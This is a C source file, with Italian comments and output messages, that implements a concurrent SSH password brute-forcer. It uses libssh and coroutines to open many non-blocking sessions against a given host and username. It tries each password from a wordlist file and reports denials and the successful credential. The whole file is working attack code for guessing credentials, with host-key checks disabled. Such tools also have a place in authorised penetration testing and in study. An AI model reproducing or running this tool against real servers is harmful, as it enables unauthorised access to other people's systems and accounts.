#include <libssh/libssh.h>
#include <libft/libft.h>
#include "utils.h"

ft_global_data_t *global_data;

void print_stat(const char *format, ...)
{
    va_list args;
    va_start(args, format);

    time(&global_data->endTime);
    global_data->elapsedTime = global_data->endTime - global_data->startTime;
    global_data->timeinfo = gmtime(&global_data->elapsedTime);
    printf(ANSI_CYAN"ELAPSED: [%02d:%02d:%02d] | " ANSI_MAGENTA "PASS TRIED: %llu | " ANSI_RESET, 
        global_data->timeinfo->tm_hour, 
        global_data->timeinfo->tm_min, 
        global_data->timeinfo->tm_sec, 
        global_data->pass_tried
        );
    vprintf(format, args);
    fflush(stdout);
    va_end(args);
}

static async_status
test(void *brute)
{
    ft_brute_t *data = (ft_brute_t *)brute;
    ssh_session session = data->session;
    char *password = data->password;
    struct async *coro = &data->coro;
    int status;

    ft_with_async(coro,
        ssh_options_set(session, SSH_OPTIONS_HOST, global_data->host);
        ssh_options_set(session, SSH_OPTIONS_PORT, &global_data->port);
        ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &global_data->verbose);
        ssh_options_set(session, SSH_OPTIONS_KNOWNHOSTS, NULL);
        ssh_options_set(session, SSH_OPTIONS_GLOBAL_KNOWNHOSTS, NULL);

        ssh_set_blocking(session, 0);

        ft_await(ssh_connect(session) != SSH_AGAIN);

        ft_breakpoint(POS);

        ft_await((status = ssh_userauth_password(session, global_data->username, password)) != SSH_AUTH_AGAIN);

        if (status == SSH_AUTH_ERROR) {
            print_stat(ANSI_RED"[SAMESESS: %d] [#CORO ID: %d] ERROR: impossibile autenticarsi come %s con %s per %s\n"ANSI_RESET, data->same_sess, data->id, global_data->username, password, ssh_get_error(session));
            ssh_disconnect(session);
            ssh_free(session);
            exit(EXIT_FAILURE);
        } else if (status == SSH_AUTH_DENIED) {
            print_stat(ANSI_YELLOW"[SAMESESS: %d] [#CORO ID: %d] DENIED: " ANSI_RESET "%s ---> %s\n"ANSI_RESET, data->same_sess, data->id, global_data->username, password);
            *async_status = ASYNC_DONE;
            return ASYNC_DONE;
        } else if (status == SSH_AUTH_SUCCESS) {
            print_stat(ANSI_GREEN"[SAMESESS: %d] [#CORO ID: %d] SUCCESS: autenticato come %s con %s\n"ANSI_RESET, data->same_sess, data->id, global_data->username, password);
            global_data->done = 1;
        } else {
            print_stat("Un altra casistica come %d - %s\n", status, ssh_get_error(session));
            ssh_disconnect(session);
            ssh_free(session);
            exit(EXIT_FAILURE);
        }
    );
}

static void
run(ft_list_coordinator_t *running)
{
    ft_brute_t *data;
    do
    {
        data = ft_fetch_session(running);

        if (data && ft_async_call(test, &data->coro, (void *)data))
        {
            ++global_data->pass_tried;
            ft_update_password(running, data);
            ft_set_async_status(&data->coro, POS);
        }

        if (data && !ssh_is_connected(data->session))
            ft_fast_recovery(data);

    } while (running->size && !global_data->done);
    ft_coordinator_free(running);
}

int main(int argc, char *argv[])
{
    if (argc < 7)
    {
        printf("Usage: %s <host> <port> <username> <password_file> <max_concurrent_session> <verbose>\n", argv[0]);
        return EXIT_FAILURE;
    }

    global_data = malloc(sizeof(ft_global_data_t));
    if (!global_data)
        return EXIT_FAILURE;

    *global_data = (ft_global_data_t) {
        .host = argv[1],
        .port = atoi(argv[2]),
        .username = argv[3],
        .filename = argv[4],
        .pass_tried = 1,
        .MAX_SESSION = atoi(argv[5]),
        .elapsedTime = 0,
        .startTime = 0,
        .endTime = 0,
        .timeinfo = NULL,
        .done = 0
    };
    time(&global_data->startTime);

    if (atoi(argv[6]) == 0)
        global_data->verbose = SSH_LOG_NOLOG;
    else
        global_data->verbose = SSH_LOG_PROTOCOL;

    ft_list_coordinator_t *running = ft_coordinator_init();
    /* Inizializzare la libreria ssh */
    ssh_init();

    WALLTIME(
        run(running);
    );

    free(global_data);
    /* Finalizzare la libreria ssh */
    ssh_finalize();
    return EXIT_SUCCESS;
}
